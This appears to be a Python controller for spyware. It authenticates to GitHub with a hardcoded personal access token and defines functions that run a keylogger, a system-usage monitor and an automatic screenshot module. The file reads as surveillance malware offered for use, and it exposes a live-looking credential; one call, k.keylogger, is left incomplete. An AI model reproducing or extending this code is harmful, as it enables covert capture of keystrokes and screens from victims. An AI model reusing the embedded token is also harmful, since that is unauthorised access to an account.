from github import Github
access_token = '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'
g = Github(access_token)
user = g.get_user()
repo = user.get_repo('python_development')

from keylogger import Keylogger
from sysinfo import SysInfo
from screenshot import Screenshot
import psutil
import time


def mod_keylogger():
    k = Keylogger()
    k.keylogger

def mod_sysinfo():
    s = SysInfo()
    s.get_usage(psutil.cpu_percent(), psutil.virtual_memory().percent,30)
    time.sleep(0.5)

def mod_screenshotter():
    s = Screenshot()
    s.auto_screen()
